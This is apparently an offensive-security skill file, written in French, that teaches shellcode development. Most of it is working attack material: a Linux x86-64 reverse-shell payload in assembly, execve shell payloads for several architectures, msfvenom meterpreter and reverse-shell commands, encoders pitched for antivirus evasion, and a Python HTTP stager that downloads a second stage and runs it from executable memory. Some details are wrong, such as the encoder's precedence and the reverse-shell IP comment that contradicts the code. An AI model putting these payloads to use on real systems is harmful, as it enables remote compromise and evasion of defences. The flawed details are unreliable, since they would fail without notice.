---
name: shellcode
description: Shellcode — développement x86/x64/ARM, encoders, stagers, polymorphism, shellcode Windows/Linux, block API, et position-independent code
tags: [shellcode, asm, x86, x64, ARM, encoder, stager, polymorphism, windows, linux]
version: 1.0
---

# Shellcode

Guide de développement shellcode — assembly position-independent pour Windows et Linux, techniques d'encodage, stagers, et polymorphism.

## 1. Shellcode Linux (x86-64)

### execve("/bin/sh")
```asm
; x86-64 Linux execve("/bin/sh", NULL, NULL)
; Taille : ~30 bytes

global _start
_start:
    xor rsi, rsi          ; argv = NULL
    push rsi               ; null terminator
    mov rdi, 0x68732f2f6e69622f  ; "/bin//sh"
    push rdi
    mov rdi, rsp
    xor rdx, rdx          ; envp = NULL
    mov al, 59             ; sys_execve
    syscall

; Méthode alternative (jmp-call-pop) :
    jmp get_data
shellcode_start:
    pop rdi                ; rdi = address of "/bin/sh"
    xor rsi, rsi
    xor rdx, rdx
    mov al, 59
    syscall
get_data:
    call shellcode_start
    db "/bin/sh", 0
```

### Reverse Shell (Linux)
```asm
; x86-64 reverse shell to 192.168.1.1:4444
; socket → connect → dup2(STDIN/STDOUT/STDERR) → execve

global _start
_start:
    ; socket(AF_INET, SOCK_STREAM, 0)
    push 41
    pop rax                ; syscall socket
    push 2
    pop rdi                ; AF_INET
    push 1
    pop rsi                ; SOCK_STREAM
    xor rdx, rdx           ; protocol = 0
    syscall
    mov r12, rax           ; save socket fd
    
    ; connect(sockfd, &sockaddr, 16)
    push 42
    pop rax                ; syscall connect
    mov rdi, r12
    ; sockaddr structure
    push rdx               ; padding
    mov dword [rsp+4], 0x0100007f  ; 127.0.0.1 (little endian)
    mov word [rsp+2], 0x5c11       ; port 4444 (0x115c = 4444)
    mov byte [rsp], 2              ; AF_INET
    mov rsi, rsp
    push 16
    pop rdx                ; addrlen
    syscall
    
    ; dup2(sockfd, STDIN)
    mov rdi, r12
    xor rsi, rsi           ; STDIN = 0
    push 33
    pop rax
    syscall
    
    ; dup2(sockfd, STDOUT)
    inc rsi                ; STDOUT = 1
    push 33
    pop rax
    syscall
    
    ; dup2(sockfd, STDERR)
    inc rsi                ; STDERR = 2
    push 33
    pop rax
    syscall
    
    ; execve("/bin/sh", NULL, NULL)
    xor rsi, rsi
    push rsi
    mov rdi, 0x68732f2f6e69622f
    push rdi
    mov rdi, rsp
    xor rdx, rdx
    push 59
    pop rax
    syscall
```

### Bind Shell (Linux)
```asm
; socket → bind → listen → accept → dup2 → execve
; Similaire mais utilise bind (49), listen (50), accept (43)
```

## 2. Shellcode Windows (x86-64)

### WinExec (LoadLibrary → GetProcAddress)
```asm
; Windows shellcode utilise l'approche :
; 1. Trouver kernel32.dll dans PEB (Process Environment Block)
; 2. Trouver GetProcAddress dans l'export table
; 3. Résoudre LoadLibraryA, WinExec, etc.
; 4. Exécuter commande

; PEB walking technique (position-independent)
global _start
_start:
    push rbx
    xor rcx, rcx
    mov rdx, [gs:rcx + 0x60]   ; PEB
    mov rdx, [rdx + 0x18]       ; LDR
    mov rdx, [rdx + 0x20]       ; InMemoryOrderModuleList
    mov rdx, [rdx]              ; ntdll.dll (first)
    mov rdx, [rdx]              ; kernel32.dll (second)
    mov rdx, [rdx + 0x20]       ; DllBase = kernel32
    push rdx
```

### Windows Block API
```asm
; Technique : résoudre les API par hash
; 1. Trouver kernel32 base
; 2. Lire export table
; 3. Hacher chaque nom exporté
; 4. Comparer avec hash attendu

; Hash function : ROR13
; hash(WinExec) = 0xAFB0D8D4
; hash(LoadLibraryA) = 0x4173B11C
; hash(ExitProcess) = 0x7B82E8F2
```

### Download + Execute
```asm
; Télécharger et exécuter depuis URL
; - URLDownloadToFileA (urlmon.dll)
; - WinExec sur fichier téléchargé
; - PowerShell -EncodedCommand
```

### Msfvenom Shellcode
```bash
# Windows
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.1 LPORT=4444 -f c
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.1.1 LPORT=4444 -f python

# Linux
msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.1.1 LPORT=4444 -f c

# Ajouter encodeur
msfvenom -p windows/x64/meterpreter/reverse_tcp -e x64/xor_dynamic -i 5 LHOST=... LPORT=... -f c
```

## 3. Encoders

### XOR Encoder (shikata_ga_nai)
```bash
# Msfvenom shikata_ga_nai (SGN) :
# - Encodage multi-pass
# - Décrypteur auto-généré
# - Chaque itération change le décrypteur
# - Anti-virus evasion

msfvenom -p windows/x64/shell_reverse_tcp -e x64/shikata_ga_nai -i 10 -f c
```

### Custom XOR + ADD Encoder
```python
from pwn import *

def encode_xor_add(shellcode, xor_key=0xAA, add_key=0xBB):
    """Custom XOR + ADD encoder"""
    encoded = []
    for byte in shellcode:
        # XOR puis ADD (décodage inverse)
        e = (byte ^ xor_key + add_key) & 0xFF
        encoded.append(e)
    return bytes(encoded)

def decoder_stub_xor_add():
    """Generate decoder stub"""
    # asm : loop XOR then SUB over shellcode
    return asm('''
        pop rsi    ; address of encoded shellcode
        mov rcx, 0x100  ; length (adjust)
    loop:
        sub byte [rsi+rcx-1], 0xBB
        xor byte [rsi+rcx-1], 0xAA
        dec rcx
        jnz loop
        jmp rsi
    ''')
```

### Alpha-Numeric Encoder
```python
# Shellcode restreint aux caractères alphanumériques (A-Z, a-z, 0-9)
# Utile pour injection dans des champs texte

# Technique : auto-modifying code
# Instructions utilisant des registres 32-bit
# Add/Sub/Xor/Inc/Dec/And/Or sur EAX, ECX, EDX

from pwn import *
shellcode = asm(shellcraft.amd64.linux.sh())
encoded = shellcraft.amd64.mem_shellcode_encode(shellcode, 'alphanumeric')
```

## 4. Stagers

### Stages vs Stageless
```
Stageless : tout le payload dans l'exploit
  - Simple, une seule connexion
  - Taille limitée par la vulnérabilité

Staged : petit stager → télécharge le stage2
  - Stager < 400 bytes
  - Stage2 : meterpreter, beacon, custom
  - Multiple round-trips
```

### HTTP/HTTPS Stager
```python
# Stager qui télécharge le stage2 via HTTP
# Petite taille (~200 bytes)

import urllib.request

def http_stager(remote_url):
    # Télécharger le deuxième stage
    response = urllib.request.urlopen(remote_url)
    stage2 = response.read()
    
    # Allouer mémoire exécutable
    import ctypes
    kernel32 = ctypes.windll.kernel32
    ptr = kernel32.VirtualAlloc(None, len(stage2), 0x3000, 0x40)
    ctypes.memmove(ptr, stage2, len(stage2))
    
    # Exécuter
    ctypes.CFUNCTYPE(None)(ptr)()
```

### DNS Stager
```python
# Stager utilisant DNS queries pour recevoir le stage2
# Chaque requête DNS = un fragment du payload
# Évite les restrictions HTTP/firewall

# dnscat2 / iodine
# Stager + DNS tunnel → stage2
```

## 5. Polymorphic Shellcode

### Self-Modifying
```asm
; Le shellcode se modifie lui-même pendant l'exécution
; Rend l'analyse statique impossible
; Chaque génération = signature différente

; Exemple : décryptage progressif
; Le shellcode commence crypté
; Une première passe décrypte le reste
; Puis exécute

; Metamorphic : réécrit complètement son code
; (plus difficile, rarement utilisé)
```

### Générateur Polymorphique
```python
import random
from pwn import *

def generate_polymorphic_shellcode(base_shellcode):
    """Génère une variante polymorphe"""
    # 1. Ajouter des NOPs (garage)
    # 2. Changer l'ordre des instructions
    # 3. Varier les registres
    # 4. Ajouter des instructions redondantes
    # 5. Encoder avec clé aléatoire
    
    # Garage NOP equivalents
    garages = [
        asm('nop'),  # x64
        asm('xchg rax, rax'),
        asm('mov rdi, rdi'),
        asm('lea rbx, [rbx]'),
        asm('sub rsp, 0'),  # no-op effect
    ]
    
    # Insérer des garages aléatoirement
    modified = bytearray()
    for byte in base_shellcode:
        if random.random() < 0.1:  # 10% chance
            modified += random.choice(garages)
        modified.append(byte)
    return bytes(modified)
```

## 6. ARM / AArch64 Shellcode

### ARM (32-bit)
```asm
; ARM execve("/bin/sh")
.section .text
.global _start
_start:
    adr r0, binsh
    eors r1, r1
    eors r2, r2
    mov r7, #11          ; sys_execve
    svc 0
binsh:
    .asciz "/bin/sh"
```

### AArch64 (64-bit)
```asm
; AArch64 execve
.global _start
_start:
    mov x0, #0
    adr x1, binsh
    mov x2, #0
    mov x8, #221         ; sys_execve (aarch64)
    svc #0
binsh:
    .asciz "/bin/sh"
```

## 7. Tests Shellcode

```bash
# Tester shellcode (Linux)
nasm -f bin shellcode.asm -o shellcode.bin
# ou compiler ELF → extraire .text

# Exécuteur de test
cat > test.c << 'EOF'
#include <stdio.h>
#include <sys/mman.h>
#include <string.h>

unsigned char code[] = { 0x90, 0x90, ... };  // shellcode ici

int main() {
    void *mem = mmap(0, sizeof(code), PROT_READ|PROT_WRITE|PROT_EXEC,
                     MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
    memcpy(mem, code, sizeof(code));
    ((void(*)())mem)();
    return 0;
}
EOF
gcc -o test test.c -z execstack
./test
```

```bash
# Tester sur Windows
# Visual Studio C++ (disable DEP)
cl.exe /Zi /nologo test.c /link /NXCOMPAT:NO
```

## 8. Tools Compendium

| Outil | Usage |
|-------|-------|
| **msfvenom** | Shellcode generator |
| **pwntools** | asm(), shellcraft |
| **NASM** | Assembler x86/x64 |
| **Donut** | .NET → shellcode |
| **ScareCrow** | Signed loader |
| **Shellter** | PE → shellcode inject |
| **BlobRunner** | Shellcode debug |
| **unicorn** | Shellcode emulation |
| **pe_to_shellcode** | PE → PIC |

## 9. Ressources

- **Shell-Storm** : http://shell-storm.org
- **Exploit Database Shellcodes** : https://www.exploit-db.com/shellcodes
- **pwntools shellcraft** : https://docs.pwntools.com
- **Bobby Tables shellcode** : x86-64 syscall table
- **Linux Syscall Table** : https://chromium.googlesource.com
- **Windows Syscall Table** : j00ru's tables